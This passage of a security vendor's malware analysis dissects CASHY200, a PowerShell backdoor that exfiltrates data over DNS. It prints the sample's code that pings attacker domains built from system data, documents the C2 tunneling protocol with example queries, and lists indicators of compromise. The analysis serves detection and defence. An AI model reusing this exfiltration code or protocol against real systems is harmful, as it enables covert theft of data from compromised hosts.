			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$domain = $rnd + $in + $id + $coun + $data + 
'.firewallsupports[.]com'
$get = cmd /c ping -n 1 $domain</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69289878e57507463583-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69289878e57507463583-2">2</div><div class="crayon-num" data-line="crayon-5f69289878e57507463583-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69289878e57507463583-1"><span class="crayon-sy">$</span><span class="crayon-v">domain</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">rnd</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">coun</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">data</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69289878e57507463583-2"><span class="crayon-s">'.firewallsupports[.]com'</span></div><div class="crayon-line" id="crayon-5f69289878e57507463583-3"><span class="crayon-sy">$</span><span class="crayon-v">get</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">cmd</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-v">ping</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">n</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">domain</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 2. Code in </em>CASHY200<em> sample using <span style="font-family: 'courier new', courier, monospace;">ping -n 1</span> to issue DNS queries to <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span></em></span></p>
<p>Similarly, we observed another CASHY200 sample that used the <span style="font-family: 'courier new', courier, monospace;">nslookup </span>command in the same manner as the ping sample except to communicate using the domain <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span>. This sample used <span style="font-family: 'courier new', courier, monospace;">nslookup -type=a &lt;domain&gt;</span> to issue the DNS queries and further strengthens the relationship between the two domains.</p>
<h2><a id="post-100088-_aa9mzqcvwa6a"></a>CASHY200 DNS Tunneling Protocol</h2>
<p>We analyzed the file<span style="font-family: 'courier new', courier, monospace;">(<span style="font-family: georgia, palatino, serif;">SHA256: </span>eccc65711cbd154f680e8c8ef343d53f29e4a6237510abd4ad1eab5742b035b3)</span> in order to understand the capabilities of the payload and the DNS tunneling protocol that was blocked at the Kuwaiti organization. This sample communicates with the domain <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span>. The DNS tunneling protocol relies on DNS A queries to send data from the Trojan to the C2 server within the subdomain of the queried domain and receive data within the IPv4 answer from the C2 server. At a high level, the CASHY200 sample associated with this activity can issue two different commands, seen in Table 2 by answering the initial beacon query with an IPv4 answer that has either <span style="font-family: 'courier new', courier, monospace;">48</span> or <span style="font-family: 'courier new', courier, monospace;">92</span> as its first octet.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 151.477px;"><strong>Command in IPv4</strong></td>
<td style="width: 1521.48px;"><strong>Description of Command</strong></td>
</tr>
<tr>
<td style="width: 151.477px;">48.x.x.x</td>
<td style="width: 1521.48px;">Run ‘hostname’ command and send the results to the C2 over DNS tunnel.</td>
</tr>
<tr>
<td style="width: 151.477px;">92.&lt;# of queries&gt;.x.x</td>
<td style="width: 1521.48px;">Obtain command to run from the answers to subsequent DNS queries and send the results to the C2 over DNS tunnel. Second octet is used to notify the payload how many DNS queries to issue to obtain the command</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 2. Commands available within CASHY200 and their functionality</em></span></p>
<p>Older samples of CASHY200 that used <span style="font-family: 'courier new', courier, monospace;">windows-updates[.]com</span> and <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span> for their C2 domains only had one command available that it would issue by including 200 as its first octet of the IPv4 answer. This command had the same functionality as the <span style="font-family: 'courier new', courier, monospace;">92</span> command seen in Table 2 above. In these older samples, the <span style="font-family: 'courier new', courier, monospace;">48</span> command was not needed as they would provide the hostname of the system within the initial beacon instead of requesting it from the C2. The command value of <span style="font-family: 'courier new', courier, monospace;">200</span> is the basis for the latter part of the CASHY200 name.</p>
<p>In general, the domains generated by CASHY200 for its DNS tunnel will be structured as seen in Figure 3. The sequence number and data for exfiltration fields are optional and are often blank depending on the Trojan&#8217;s request type. For instance, the first DNS query that acts as a beacon does not have a sequence number or data exfiltration field. In addition, older samples of CASHY200 use 4 random characters instead of 5.</p>
<p style="text-align: left;"><span style="font-family: 'courier new', courier, monospace;">&lt;5 random characters&gt;&lt;hexlified request type&gt;&lt;hexlified unique<br />
hostname&gt;&lt;sequence number&gt;&lt;data for<br />
exfiltration&gt;.windows64x[.]com<br />
</span><span style="font-family: 'courier new', courier, monospace;"><span style="font-size: 10pt;"><em>   <span style="font-family: georgia, palatino, serif;">Figure 3. Structure of the DNS queries generated by CASHY200 for its DNS tunneling protocol</span></em></span><br />
</span></p>
<p>The request type field allows CASHY200 to tell the C2 server the purpose of the DNS query it issued. This allows the C2 server to respond to the inbound query with the appropriate IPv4 address within the DNS answer. Table 3 provides all of the available request types and the purpose of the DNS query. It is important to note that CASHY200 samples using <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span> as a C2 server can receive commands within the response to both the <span style="font-family: 'courier new', courier, monospace;">d </span>or the <span style="font-family: 'courier new', courier, monospace;">q</span> request types, whereas older samples can only process commands from responses to the <span style="font-family: 'courier new', courier, monospace;">q </span>request type.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 16.8133%;"><strong>Request type</strong></td>
<td style="width: 82.5024%;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 16.8133%;">d</td>
<td style="width: 82.5024%;">Initial ‘hello’ beacon.</td>
</tr>
<tr>
<td style="width: 16.8133%;">q</td>
<td style="width: 82.5024%;">Requesting command beacon.</td>
</tr>
<tr>
<td style="width: 16.8133%;">f</td>
<td style="width: 82.5024%;">Finished sending results.</td>
</tr>
<tr>
<td style="width: 16.8133%;">c</td>
<td style="width: 82.5024%;">Sending number of upcoming queries to send the custom command results.</td>
</tr>
<tr>
<td style="width: 16.8133%;">h</td>
<td style="width: 82.5024%;">Obtaining data from C2 within IPv4 answers.</td>
</tr>
<tr>
<td style="width: 16.8133%;">a</td>
<td style="width: 82.5024%;">Sending hostname command results within subdomain.</td>
</tr>
<tr>
<td style="width: 16.8133%;">r</td>
<td style="width: 82.5024%;">Sending custom command results within subdomain.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 3. Request types that CASHY200 will use to notify C2 of the purpose of each DNS query</em></span></p>
<p>In the CASHY200 tunnel that was blocked by DNS Security, the &lt;<span style="font-family: 'courier new', courier, monospace;">hexlified unique hostname&gt;</span> was a string hardcoded by the actor into the Trojan, which appears unique to the infected system. This hardcoded hostname suggested that the threat actor created the CASHY200 sample specifically for the compromised host, which also allowed us to quickly determine the infected hosts to triage remediation efforts. Older samples of CASHY200 use randomly generated identifiers that the Trojan stores in the registry, one location was <span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Cashe\index</span>, which was the basis of the front portion of the name CASHY200.</p>
<p>As previously mentioned, the sequence number only appears within the queried subdomain when CASHY200 sends data to the C2 server. CASHY200 will start the sequence number at <span style="font-family: 'courier new', courier, monospace;">101</span> and increment this value each query it sends until it has transmitted all of the data to the C2.</p>
<h2><a id="post-100088-_sgt6c9tdvk51"></a>CASHY200 DNS Tunnel Example</h2>
<p>To understand and visualize the DNS tunneling protocol used by CASHY200, we created a C2 server to interact with and issue commands to the backdoor. We created the C2 server to interact with the CASHY200 sample configured with <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span> which can process two commands: <span style="font-family: 'courier new', courier, monospace;">48</span> or <span style="font-family: 'courier new', courier, monospace;">92</span> within the first octet of the DNS A record answer (see Table 2 for command description). Figure 4 below shows a network packet capture of CASHY200 interacting with our C2 server. This image shows CASHY200 receiving the ‘hostname’ command followed by a custom command of ‘whoami’, both of which the backdoor will run and transmit the results back to the C2.</p>
<p>Of note, Figure 4 shows the DNS server responding to these queries with<span style="font-family: 'courier new', courier, monospace;"> 1.2.3.4</span>, which is just a placeholder we included in our C2 server as CASHY200 ignores the DNS response when sending data.</p>
<p style="text-align: center;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’.png" rel="wpdevart_lightbox"><img class="aligncenter wp-image-100104 size-large" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’-1024x659.png" alt="" width="1024" height="659" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’-1024x659.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’-300x193.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’-768x494.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’-900x579.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’-370x238.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-DNS-traffic-associated-with-CASHY200-receiving-and-responding-to-the-‘hostname’-followed-by-a-custom-command-‘whoami’.png 1510w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><span style="font-size: 10pt;"><em>Figure 4. DNS traffic associated with CASHY200 receiving and responding to the ‘hostname’ followed by a custom command ‘whoami’</em></span></p>
<p>In Figure 4, the first DNS query to resolve is<br />
<span style="font-family: 'courier new', courier, monospace;">yFIOr645245444143544544.windows64x[.]com</span> which acts as an initial beacon. The first five characters (yFIOr) are random and have no purpose other than generating random subdomains in order to avoid DNS caching. The next two characters (<span style="font-family: 'courier new', courier, monospace;">64</span>) signify the Hex notation of the <span style="font-family: 'courier new', courier, monospace;">d</span> request type, which is the request type for the initial beacon as noted in Table 3. The request type is followed by the system specific hostname hardcoded into the sample, which in this case is<span style="font-family: 'courier new', courier, monospace;"> 5245444143544544</span> for <span style="font-family: 'courier new', courier, monospace;">&lt;REDACTED&gt;</span>.</p>
<p>To issue the <span style="font-family: 'courier new', courier, monospace;">48</span> command to get the hostname of the system, the C2 server responds to the initial beacon query with 48 as the first octet of the IPv4 answer, specifically <span style="font-family: 'courier new', courier, monospace;">48.0.0.0.</span> The C2 server does not have to issue this IPv4 specifically to issue the ‘hostname’ command, as CASHY200 ignores the remaining three octets and runs the &#8216;hostname&#8217; command. Our test system had a hostname of <span style="font-family: 'courier new', courier, monospace;">test-system-ftw</span>, which CASHY200 sends to the C2 server in a sequence of DNS queries to resolve the following:</p>
<ol>
<li><span style="font-family: 'courier new', courier, monospace;">pevtF6152454441435445443130316447567a6443317a65584e305a57303d.windows64x[.]com</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">diosk6152454441435445443130324c575a3064773d3d.windows64x[.]com</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">weDlz615245444143544544313033.windows64x[.]com</span></li>
<li style="list-style-type: none;"></li>
</ol>
<p>These DNS queries contain the results of the ‘hostname’ command using the request type <span style="font-family: 'courier new', courier, monospace;">a</span> (<span style="font-family: 'courier new', courier, monospace;">61</span>) in the subdomain of the three queries) in order to transmit the data. Following the request type is the data to be sent within these DNS queries. The C2 server uses sequence numbers to put the queries in the correct order before base64 decoding the data in each query. In our example, the data, which converted from hexadecimal notation results in <span style="font-family: 'courier new', courier, monospace;">101dGVzdC1zeXN0ZW0=<span style="font-family: georgia, palatino, serif;">,</span> 102LWZ0dw== <span style="font-family: georgia, palatino, serif;">and</span> 103</span>. The C2 server then concatenates the decoded data from each query to create the results. Table 4 shows how the C2 would process the ‘hostname’ command results sent by CASHY200 to produce <span style="font-family: 'courier new', courier, monospace;">test-system-ftw</span>.</p>
<table style="width: 100%; height: 92px;">
<tbody>
<tr style="height: 23px;">
<td style="width: 35.2657%; height: 23px;"><strong>Sequence Number</strong></td>
<td style="width: 36.9082%; height: 23px;"><strong>Encoded Data</strong></td>
<td style="width: 27.0531%; height: 23px;"><strong>Decoded Data</strong></td>
</tr>
<tr style="height: 23px;">
<td style="width: 35.2657%; height: 23px;">101</td>
<td style="width: 36.9082%; height: 23px;">dGVzdC1zeXN0ZW0=</td>
<td style="width: 27.0531%; height: 23px;">test-system</td>
</tr>
<tr style="height: 23px;">
<td style="width: 35.2657%; height: 23px;">102</td>
<td style="width: 36.9082%; height: 23px;">LWZ0dw==</td>
<td style="width: 27.0531%; height: 23px;">-ftw</td>
</tr>
<tr style="height: 23px;">
<td style="width: 35.2657%; height: 23px;">103</td>
<td style="width: 36.9082%; height: 23px;">&lt;no data&gt;</td>
<td style="width: 27.0531%; height: 23px;"></td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em style="text-align: center;">Table 4. Our C2 processing data sent by CASHY200 in response to the ‘hostname’ command</em></span></p>
<p>After sending the results of the ‘hostname’ command, CASHY200 issues the <span style="font-family: 'courier new', courier, monospace;">UDmEJ665245444143544544.windows64x[.]com</span> DNS query with the request type <span style="font-family: 'courier new', courier, monospace;">f</span> (<span style="font-family: 'courier new', courier, monospace;">66</span> in the subdomain) to notify the C2 it is done sending data. After sending the results of the ‘hostname’ command, CASHY200 issues a query to resolve <span style="font-family: 'courier new', courier, monospace;">GmhpF715245444143544544.windows64x[.]com</span> with a request type of <span style="font-family: 'courier new', courier, monospace;">q </span>(<span style="font-family: 'courier new', courier, monospace;">71</span> in the subdomain). CASHY200 issues this request to obtain a custom command from the C2 server to run in command prompt.</p>
<p>The packet capture in Figure 4 shows our C2 server responding to the CASHY200 query with a request type of <span style="font-family: 'courier new', courier, monospace;">q </span>and IPv4 address of 92.2.0.0. As mentioned in Table 2, CASHY200 will parse this IPv4 as a custom command with the first octet of the IPv4 (<span style="font-family: 'courier new', courier, monospace;">92</span>) signaling the issued custom command and the second octet (<span style="font-family: 'courier new', courier, monospace;">2</span>) as the number of DNS queries the backdoor must issue to download the entire command from the C2 server’s answers to queries. The command data is issued via IPv4 addresses within the DNS answers, which is a very inefficient way of transmitting data as the C2 can only send four bytes of data for each DNS query the Trojan issues.</p>
<p>Based on the answer <span style="font-family: 'courier new', courier, monospace;">92.2.0.0</span>, CASHY200 issues the following two DNS queries, both of which have a request type of <span style="font-family: 'courier new', courier, monospace;">h</span> (<span style="font-family: 'courier new', courier, monospace;">68</span> in the subdomains) and sequence numbers of <span style="font-family: 'courier new', courier, monospace;">100</span> and <span style="font-family: 'courier new', courier, monospace;">101</span> (<span style="font-family: 'courier new', courier, monospace;">313030</span> and <span style="font-family: 'courier new', courier, monospace;">313031</span> in the subdomains):</p>
<ol>
<li><span style="font-family: 'courier new', courier, monospace;">iQKEe685245444143544544313030.windows64x[.]com</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">TyxLC685245444143544544313031.windows64x[.]com</span></li>
<li style="list-style-type: none;"></li>
</ol>
<p>The C2 server answers these two queries with the IPv4 addresses <span style="font-family: 'courier new', courier, monospace;">119.104.111.97</span> and <span style="font-family: 'courier new', courier, monospace;">109.105.0.0</span>, which CASHY200 processes by treating each octet as a byte of data and concatenating all the bytes to receive the command. For instance, Table 5 shows how CASHY200 would process the two IPv4 answers to obtain the command ‘whoami’.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 105.114px;"><strong>IPv4 Answer</strong></td>
<td style="width: 131.477px;"><strong>Octets in Ascii</strong></td>
<td style="width: 132.386px;"><strong>Resulting string</strong></td>
</tr>
<tr>
<td style="width: 105.114px;">119.104.111.97</td>
<td style="width: 131.477px;">‘w’.’h’.’o’.’a’</td>
<td style="width: 132.386px;">whoa</td>
</tr>
<tr>
<td style="width: 105.114px;">109.105.0.0</td>
<td style="width: 131.477px;">‘m’.’i’.’\x00’.’\x00’</td>
<td style="width: 132.386px;">mi</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Table 5. CASHY200 processing IPv4 answers from our C2 to get a custom command to run ‘whoami’</span> </em></p>
<p>After running the custom command ‘whoami’, CASHY200 sends the results to the C2 server in a slightly different manner than how it sends the results of the ‘hostname’ command discussed earlier. CASHY200 begins sending the results of the custom command by issuing a query to resolve <span style="font-family: 'courier new', courier, monospace;">YqpZf6352454441435445443.windows64x[.]com</span>, which contains a request type of <span style="font-family: 'courier new', courier, monospace;">c</span> (<span style="font-family: 'courier new', courier, monospace;">63</span> in the subdomain) and the number <span style="font-family: 'courier new', courier, monospace;">3</span> as the data field. CASHY200 uses the number in the data field of this request to notify the C2 how many queries it will send to transmit the results of the custom command.</p>
<p>After sending the count of queries required to transmit the results, CASHY200 issues the following three queries, all of which have a request type of <span style="font-family: 'courier new', courier, monospace;">r</span> (<span style="font-family: 'courier new', courier, monospace;">72</span> in the subdomains):</p>
<ol>
<li><span style="font-family: 'courier new', courier, monospace;">QMNnv7252454441435445443130316447567a6443317a65584e305a57303d.windows64x[.]com</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">OlBCh7252454441435445443130324c575a30643178305a584e304c513d3d.windows64x[.]com</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">XUkra72524544414354454431303364584e6c63673d3d.windows64x[.]com</span></li>
<li style="list-style-type: none;"></li>
</ol>
<p>The three queries used to send the results of the custom command include a sequence number starting at <span style="font-family: 'courier new', courier, monospace;">101</span> that increments each query followed by data, all of which is represented as hexadecimal bytes. After converting the hexadecimal bytes, the queries contain <span style="font-family: 'courier new', courier, monospace;">101dGVzdC1zeXN0ZW0=</span>, <span style="font-family: 'courier new', courier, monospace;">102LWZ0d1x0ZXN0LQ==<span style="font-family: georgia, palatino, serif;">, and</span> 103dXNlcg==</span>, which shows the incrementing sequence numbers followed by the base64 encoded results of the custom ‘whoami’ command, which in our test case was <span style="font-family: 'courier new', courier, monospace;">test-system-ftw\test-user</span>. Table 6 shows how the C2 server will process the three queries issued by CASHY200 to transmit the results of the custom command.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 151.477px;"><strong>Sequence Number</strong></td>
<td style="width: 164.205px;"><strong>Encoded Data</strong></td>
<td style="width: 115.114px;"><strong>Decoded Data</strong></td>
</tr>
<tr>
<td style="width: 151.477px;">101</td>
<td style="width: 164.205px;">dGVzdC1zeXN0ZW0=</td>
<td style="width: 115.114px;">test-system</td>
</tr>
<tr>
<td style="width: 151.477px;">102</td>
<td style="width: 164.205px;">LWZ0d1x0ZXN0LQ==</td>
<td style="width: 115.114px;">-ftw\test-</td>
</tr>
<tr>
<td style="width: 151.477px;">103</td>
<td style="width: 164.205px;">dXNlcg==</td>
<td style="width: 115.114px;">user</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Table 6. Our C2 processing data sent by CASHY200 in response to the custom command ‘whoami’</span> </em></p>
<p>After sending the results of the custom ‘whoami’ command, CASHY200 issues the DNS query <span style="font-family: 'courier new', courier, monospace;">fvSwZ665245444143544544.windows64x[.]com</span> with the request type <span style="font-family: 'courier new', courier, monospace;">f</span> (<span style="font-family: 'courier new', courier, monospace;">66</span> in the subdomain) to notify the C2 it is done sending data.</p>
<h2><a id="post-100088-_bij986rrxbv2"></a>Conclusion</h2>
<p>According to our <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">initial publication</a>, the xHunt Campaign targeted Kuwaiti organizations using several custom tools to compromise systems. We discovered another custom tool that we call CASHY200, which is a PowerShell-based backdoor that communicates with a C2 server using DNS tunneling. We found evidence through open source collection that this threat group used CASHY200 to target Kuwaiti government organizations. While we cannot confirm the specific organizations mentioned in the open source, we can confirm that another Kuwaiti organization was targeted by this group based on our own telemetry from our DNS Security service. These discoveries suggest that this threat group has targeted Kuwaiti organizations since the spring of 2018 through 2019, which includes organizations in both government and shipping and transportation industries.</p>
<p>Palo Alto Networks customers are protected from the tools mentioned in this blog through the following:</p>
<ul>
<li style="list-style-type: none;">
<ul style="list-style-type: disc;">
<li>Customers using AutoFocus can view this activity by using the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.xHunt"><em>xHunt</em></a> and <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.CASHY200"><em>CASHY200</em></a> tags</li>
<li>The DNS tunneling protocols referenced in this blog are detected through <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security">DNS Security</a> automated detection.</li>
<li>C2 domains <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span>, <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span>, <span style="font-family: 'courier new', courier, monospace;">windows-updates[.]com</span>, and <span style="font-family: 'courier new', courier, monospace;">winx64-microsoft[.]com</span> are classified as malicious in <a href="https://www.paloaltonetworks.com/products/threat-prevention-services">Threat Prevention</a> and <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security">URL Filtering</a>.</li>
<li>All CASHY200 samples identified are detected as malicious by WildFire and Traps.</li>
<li>All CASHY200 tunneling protocols are blocked by DNS Security.</li>
</ul>
</li>
</ul>
<p><em>Special thanks to Daiping Liu and Jun Javier Wang for the notification and assistance regarding the </em><a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security"><em>DNS Security service</em></a><em> blocking this DNS tunneling activity.</em></p>
<p><span style="color: #808080; font-size: 10pt;">Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.</span></p>
<h2><a id="post-100088-_xqn7tuz3dozs"></a>Indicators of Compromise</h2>
<h4><a id="post-100088-_e9i7gei41krh"></a>Executable Droppers</h4>
<p>ffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9<br />
3e13f539071d56106e252566b436933ccffd2d509f0c3fae916748971663946c<br />
1f48eceb9dca085d8eb2bcea1dde28e2643e1b198b0a7e998d7708fa68d43575<br />
79c8ceb3627a8d35c8e7255007d87af8e20f1eb341b5446da1e063cf5da39c6f</p>
<h4><a id="post-100088-_14wpf1j2gy0k"></a>Word Delivery Documents</h4>
<p>bce37fc0d97ac6bed24098ecf4187081e9a664c87d4fe558f3e46928140c835f<br />
5a3c156565f4243eacf179b95696a15a2e1c460315ff0940c0c71c4f587eb4b3<br />
45b2db5a78758f9d5125897da4a31c67e68424269eeed58646a87326a2b45d80<br />
ce6b44af79db56be053f63426acee02c591a2e19ef29f43227ea5b0640e9b24a<br />
0b5476369bca1d9998aa4a53dfe9e958268cd48ac69f9a16001f842330133fe6<br />
396235b998ab348e7f82f1145e8566820652f187c28df2cdeb0dc9b0ef790422</p>
<h4><a id="post-100088-_i3egcswuxqkj"></a>CASHY200 Samples</h4>
<p>eccc65711cbd154f680e8c8ef343d53f29e4a6237510abd4ad1eab5742b035b3<br />
a0ce856d224ee04558e5cb67bda8ae4733dd40f5a8e59ab5a799d7d1378625b4<br />
b62c3aa413cc5bd551836328b9740ddd50c1a8aa7a04ea0e301fa507724e18f6<br />
e36a4056b32e094ff6b0aefb2ffe11f033969dc10fa58199559d8c117d0e1b6f<br />
2b73fe5b9ba44fadcee8657cb2d2b37aab8d0a3be4ed1f437c83f4594e501cd6<br />
788687e478704b324089af011cbe20d9d3a590283dd85e45ffe3e51a340f58ca<br />
ffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9<br />
3e13f539071d56106e252566b436933ccffd2d509f0c3fae916748971663946c<br />
1f48eceb9dca085d8eb2bcea1dde28e2643e1b198b0a7e998d7708fa68d43575<br />
79c8ceb3627a8d35c8e7255007d87af8e20f1eb341b5446da1e063cf5da39c6f</p>
<h4><a id="post-100088-_4oizhzw03p76"></a>CASHY200 C2 domains</h4>
<p>windows64x[.]com<br />
winx64-microsoft[.]com<br />
firewallsupports[.]com<br />
windows-updates[.]com</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
